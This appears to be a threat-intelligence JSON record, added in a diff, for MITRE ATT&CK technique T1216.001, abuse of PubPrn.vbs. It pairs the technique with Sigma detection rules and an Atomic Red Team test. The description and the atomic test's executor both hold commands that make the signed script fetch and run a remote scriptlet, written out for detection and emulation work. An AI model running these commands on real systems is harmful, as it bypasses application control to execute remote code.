@@ -1,0 +1,102 @@
+{
+    "id": "T1216.001",
+    "name": "PubPrn",
+    "description": "Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a [Visual Basic](T1059.005) script that publishes a printer to Active Directory Domain Services. The script is signed by Microsoft and is commonly executed through the [Windows Command Shell](T1059.003) via `Cscript.exe`. For example, the following code publishes a printer within the specified domain: `cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com`.(Citation: pubprn)\nAdversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.(Citation: Enigma0x3 PubPrn Bypass) To do so, adversaries may set the second `script:` parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is `pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct`. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.\nIn later versions of Windows (10+), `PubPrn.vbs` has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to `LDAP://`, vice the `script:` moniker which could be used to reference remote code via HTTP(S).",
+    "platforms": "Windows",
+    "kill_chain_phases": "Defense Evasion",
+    "data_sources": "Process: Process Creation, Command: Command Execution, Script: Script Execution",
+    "detection": "Monitor script processes, such as `cscript`, and command-line parameters for scripts like PubPrn.vbs that may be used to proxy execution of malicious files.",
+    "url": "https://attack.mitre.org/techniques/T1216/001",
+    "enrichments": {
+        "attack_rule_map": [
+            {
+                "tech_id": "T1216.001",
+                "atomic_attack_guid": "9dd29a1f-1e16-4862-be83-913b10a88f6c",
+                "atomic_attack_name": "PubPrn.vbs Signed Script Bypass",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Pubprn.vbs Proxy Execution",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_lolbin_pubprn.yml",
+                        "remote_content": "title: Pubprn.vbs Proxy Execution\nid: 1fb76ab8-fa60-4b01-bddd-71e89bf555da\nstatus: test\ndescription: Detects the use of the 'Pubprn.vbs' Microsoft signed script to execute commands.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Scripts/Pubprn/\nauthor: frack113\ndate: 2022-05-28\ntags:\n    - attack.defense-evasion\n    - attack.t1216.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - '\\pubprn.vbs'\n            - 'script:'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "WSF/JSE/JS/VBA/VBE File Execution Via Cscript/Wscript",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules-threat-hunting/windows/process_creation/proc_creation_win_wscript_cscript_script_exec.yml",
+                        "remote_content": "title: WSF/JSE/JS/VBA/VBE File Execution Via Cscript/Wscript\nid: 1e33157c-53b1-41ad-bbcc-780b80b58288\nrelated:\n    - id: 23250293-eed5-4c39-b57a-841c8933a57d\n      type: obsolete\n    - id: cea72823-df4d-4567-950c-0b579eaf0846\n      type: derived\nstatus: test\ndescription: Detects script file execution (.js, .jse, .vba, .vbe, .vbs, .wsf) by Wscript/Cscript\nreferences:\n    - https://thedfirreport.com/2023/10/30/netsupport-intrusion-results-in-domain-compromise/\n    - https://redcanary.com/blog/gootloader/\nauthor: Michael Haag\ndate: 2019-01-16\nmodified: 2023-05-15\ntags:\n    - attack.execution\n    - attack.t1059.005\n    - attack.t1059.007\n    - detection.threat-hunting\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName:\n              - 'wscript.exe'\n              - 'cscript.exe'\n        - Image|endswith:\n              - '\\wscript.exe'\n              - '\\cscript.exe'\n    selection_cli:\n        CommandLine|contains:\n            - '.js'\n            - '.jse'\n            - '.vba'\n            - '.vbe'\n            - '.vbs'\n            - '.wsf'\n    condition: all of selection_*\nfalsepositives:\n    - Some additional tuning is required. It is recommended to add the user profile path in CommandLine if it is getting too noisy.\nlevel: medium\n"
+                    }
+                ]
+            }
+        ],
+        "cycat": {
+            "cycat": {
+                "cycat_related_uuids": [
+                    "45d3a03d-f441-458c-8883-df101a3bb146",
+                    "1fb76ab8-fa60-4b01-bddd-71e89bf555da",
+                    "09cd431f-eaf4-4d2a-acaf-2a7acfe7ed58"
+                ],
+                "lookup_results": [
+                    {
+                        "uuid": "45d3a03d-f441-458c-8883-df101a3bb146",
+                        "lookup_data": {
+                            "description": "Detects the use of the 'Launch-VsDevShell.ps1' Microsoft signed script to execute commands.",
+                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/08/19\ndescription: Detects the use of the 'Launch-VsDevShell.ps1' Microsoft signed script\n  to execute commands.\ndetection:\n  condition: all of selection_*\n  selection_flags:\n    CommandLine|contains:\n    - 'VsWherePath '\n    - 'VsInstallationPath '\n  selection_script:\n    CommandLine|contains: Launch-VsDevShell.ps1\nfalsepositives:\n- Legitimate usage of the script by a developer\nid: 45d3a03d-f441-458c-8883-df101a3bb146\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://twitter.com/nas_bench/status/1535981653239255040\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1216.001\ntitle: Launch-VsDevShell.PS1 Proxy Execution\n",
+                            "sigma:id": "45d3a03d-f441-458c-8883-df101a3bb146",
+                            "title": "Launch-VsDevShell.PS1 Proxy Execution",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "1fb76ab8-fa60-4b01-bddd-71e89bf555da",
+                        "lookup_data": {
+                            "description": "Detects the use of the 'Pubprn.vbs' Microsoft signed script to execute commands.",
+                            "raw": "author: frack113\ndate: 2022/05/28\ndescription: Detects the use of the 'Pubprn.vbs' Microsoft signed script to execute\n  commands.\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - \\pubprn.vbs\n    - 'script:'\nfalsepositives:\n- Unknown\nid: 1fb76ab8-fa60-4b01-bddd-71e89bf555da\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://lolbas-project.github.io/lolbas/Scripts/Pubprn/\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1216.001\ntitle: Pubprn.vbs Proxy Execution\n",
+                            "sigma:id": "1fb76ab8-fa60-4b01-bddd-71e89bf555da",
+                            "title": "Pubprn.vbs Proxy Execution",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "09cd431f-eaf4-4d2a-acaf-2a7acfe7ed58",
+                        "lookup_data": {
+                            "mitre-attack-id": "T1216.001",
+                            "mitre-cti:description": "Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a [Visual Basic](https://attack.mitre.org/techniques/T1059/005) script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) via <code>Cscript.exe</code>. For example, the following code publishes a printer within the specified domain: <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>.(Citation: pubprn)\n\nAdversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.(Citation: Enigma0x3 PubPrn Bypass) To do so, adversaries may set the second <code>script:</code> parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.\n\nIn later versions of Windows (10+), <code>PubPrn.vbs</code> has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to <code>LDAP://</code>, vice the <code>script:</code> moniker which could be used to reference remote code via HTTP(S).",
+                            "mitre-cti:name": "PubPrn",
+                            "mitre-cti:type": "attack-pattern",
+                            "raw": "{'x_mitre_platforms': ['Windows'], 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_contributors': ['Atul Nair, Qualys'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'type': 'attack-pattern', 'id': 'attack-pattern--09cd431f-eaf4-4d2a-acaf-2a7acfe7ed58', 'created': '2020-02-03T16:49:57.788Z', 'x_mitre_version': '2.0', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1216.001', 'url': 'https://attack.mitre.org/techniques/T1216/001'}, {'source_name': 'pubprn', 'url': 'https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/pubprn', 'description': 'Jason Gerend. (2017, October 16). pubprn. Retrieved July 23, 2021.'}, {'source_name': 'Enigma0x3 PubPrn Bypass', 'url': 'https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/', 'description': 'Nelson, M. (2017, August 3). WSH INJECTION: A CASE STUDY. Retrieved April 9, 2018.'}], 'x_mitre_deprecated': False, 'revoked': False, 'description': 'Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a [Visual Basic](https://attack.mitre.org/techniques/T1059/005) script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) via <code>Cscript.exe</code>. For example, the following code publishes a printer within the specified domain: <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>.(Citation: pubprn)\\n\\nAdversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.(Citation: Enigma0x3 PubPrn Bypass) To do so, adversaries may set the second <code>script:</code> parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.\\n\\nIn later versions of Windows (10+), <code>PubPrn.vbs</code> has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to <code>LDAP://</code>, vice the <code>script:</code> moniker which could be used to reference remote code via HTTP(S).', 'modified': '2022-04-18T14:55:35.817Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'name': 'PubPrn', 'x_mitre_detection': 'Monitor script processes, such as `cscript`, and command-line parameters for scripts like PubPrn.vbs that may be used to proxy execution of malicious files.', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}], 'x_mitre_is_subtechnique': True, 'x_mitre_data_sources': ['Process: Process Creation', 'Command: Command Execution', 'Script: Script Execution'], 'x_mitre_defense_bypassed': ['Digital Certificate Validation', 'Application Control'], 'x_mitre_attack_spec_version': '2.1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5'}",
+                            "_cycat_type": "Item"
+                        }
+                    }
+                ]
+            }
+        },
+        "atomics": [
+            {
+                "attack_technique": "T1216.001",
+                "display_name": "Signed Script Proxy Execution: Pubprn",
+                "atomic_tests": [
+                    {
+                        "name": "PubPrn.vbs Signed Script Bypass",
+                        "auto_generated_guid": "9dd29a1f-1e16-4862-be83-913b10a88f6c",
+                        "description": "Executes the signed PubPrn.vbs script with options to download and execute an arbitrary payload.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "remote_payload": {
+                                "description": "A remote payload to execute using PubPrn.vbs.",
+                                "type": "url",
+                                "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216.001/src/T1216.001.sct"
+                            }
+                        },
+                        "executor": {
+                            "command": "cscript.exe /b C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs localhost \"script:#{remote_payload}\"\n",
+                            "name": "command_prompt"
+                        }
+                    }
+                ]
+            }
+        ]
+    },
+    "timestamp": "2025-02-28 14:08:26"
+}
